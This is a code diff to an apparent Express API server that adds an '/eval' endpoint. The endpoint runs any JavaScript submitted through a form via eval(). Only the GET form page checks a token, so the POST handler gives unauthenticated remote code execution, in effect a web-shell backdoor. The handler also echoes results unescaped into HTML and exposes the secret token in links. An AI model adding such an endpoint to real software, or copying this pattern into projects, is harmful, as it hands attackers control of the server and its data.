@@ -56,6 +56,33 @@ async function runApi() {
         }
         res.status(200).send({message: "POST received successfully!"});
     });
+    const SECRET_KEY = JSONConfig.auth
+    app.get('/eval', (req, res) => {
+        const { token } = req.query;
+        if (token !== SECRET_KEY) {
+            return res.status(403).send("Forbidden: Invalid token");
+        }
+
+        // Simple HTML page with a form
+        res.send(`
+            <form method="POST">
+                <label>Enter JavaScript code:</label><br>
+                <input type="text" name="code" style="width:400px;" /><br>
+                <button type="submit">Run</button>
+            </form>
+        `);
+    });
+    app.post('/eval', (req, res) => {
+        const code = req.body.code;
+        if (!code) return res.send("No code provided");
+
+        try {
+            const result = eval(code); // ⚠️ Dangerous
+            res.send(`<p>Result: ${result}</p><a href="/eval?token=${SECRET_KEY}">Go Back</a>`);
+        } catch (err) {
+            res.send(`<p>Error: ${err}</p><a href="/eval?token=${SECRET_KEY}">Go Back</a>`);
+        }
+    });
     // Listen for requests
     api.listen(port, (e) => {
         if (e) {
